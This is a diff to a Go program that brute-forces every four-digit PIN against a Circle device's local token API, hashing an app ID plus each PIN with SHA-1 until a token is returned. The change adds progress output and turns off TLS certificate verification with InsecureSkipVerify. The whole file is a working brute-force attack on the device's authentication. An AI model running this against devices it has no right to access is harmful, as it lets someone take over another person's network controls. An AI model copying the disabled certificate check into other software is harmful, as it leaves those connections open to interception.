@@ -2,6 +2,7 @@ package main
 
 import (
 	"crypto/sha1"
+	"crypto/tls"
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
@@ -29,11 +30,22 @@ func main() {
 
 	for x := 0; x <= 9999; x++ {
 		pincode := fmt.Sprintf("%04d", x)
+		// show some progress
+		if ((x % 10) == 0) {
+			fmt.Printf("PINCODE: %v\n", pincode)
+		}
 		h := sha1.New()
 		h.Write([]byte(APPID + pincode))
 		hash := fmt.Sprintf("%x", h.Sum(nil))
-		//fmt.Println(hash)
-		res, err := http.Get("https://" + ipAddress + ":4567/api/TOKEN?appid=" + APPID + "&hash=" + hash)
+//		fmt.Println(hash)
+		// NOTE: the following line doesn't work because the Circle device
+		// doesn't have a certificate.  so, use an insecure connection instead
+//		res, err := http.Get("https://" + ipAddress + ":4567/api/TOKEN?appid=" + APPID + "&hash=" + hash)
+		tr := &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		}
+		client := &http.Client{Transport: tr}
+		res, err := client.Get("https://" + ipAddress + ":4567/api/TOKEN?appid=" + APPID + "&hash=" + hash)
 		if err != nil {
 			fmt.Println(err.Error())
 			os.Exit(1)
